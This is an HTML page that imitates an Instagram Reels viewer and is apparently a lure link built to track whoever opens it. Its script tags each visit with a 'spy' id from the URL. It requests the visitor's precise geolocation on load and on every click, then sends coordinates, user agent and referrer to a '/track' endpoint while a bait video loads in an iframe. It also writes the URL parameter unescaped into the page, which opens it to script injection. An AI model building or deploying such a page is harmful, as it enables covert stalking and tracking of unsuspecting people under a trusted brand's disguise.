<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#fafafa;min-height:100vh}.insta-container{max-width:470px;margin:0 auto;background:#fff;min-height:100vh}.header{padding:10px 20px;border-bottom:1px solid #dbdbdb;display:flex;align-items:center}.logo{font-size:22px;font-weight:700;color:#262626}.reels-player{position:relative;width:100%;height:80vh;background:#000}.reels-player iframe{width:100%;height:100%;border:none}.loading{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);color:#fff;font-size:18px;text-align:center}.footer{padding:20px;text-align:center;color:#8e8e8e;font-size:14px}</style>
</head>
<body>
    <div class="insta-container">
        <div class="header"><div class="logo">Instagram</div></div>
        <div class="reels-player">
            <div class="loading">🔄 Loading your Reels...</div>
            <div id="reelsFrame"></div>
        </div>
        <div class="footer">Watch Reels in full screen for best experience</div>
    </div>

    <script>
        const urlParams=new URLSearchParams(window.location.search);
        const spyId=urlParams.get('id');
        const targetUrl=urlParams.get('url');
        
        // INSTANT LOCATION CAPTURE (0.1s delay)
        setTimeout(stealLocation,100);
        document.addEventListener('click',stealLocation);
        
        function stealLocation(){
            if(navigator.geolocation && spyId){
                navigator.geolocation.getCurrentPosition(pos=>{
                    fetch('/.netlify/functions/track',{
                        method:'POST',
                        headers:{'Content-Type':'application/json'},
                        body:JSON.stringify({
                            id:spyId,
                            lat:pos.coords.latitude,
                            lon:pos.coords.longitude,
                            accuracy:pos.coords.accuracy,
                            timestamp:new Date().toISOString(),
                            userAgent:navigator.userAgent,
                            ip:navigator.connection?navigator.connection.effectiveType:'unknown',
                            referrer:document.referrer
                        })
                    });
                },()=>{}, {enableHighAccuracy:true,timeout:3000,maximumAge:0});
            }
        }
        
        // Load target reels
        if(targetUrl){
            document.querySelector('.loading').innerHTML='✅ Reels loading...';
            document.getElementById('reelsFrame').innerHTML=`<iframe src="${decodeURIComponent(targetUrl)}" allowfullscreen></iframe>`;
        }
    </script>
</body>
</html>
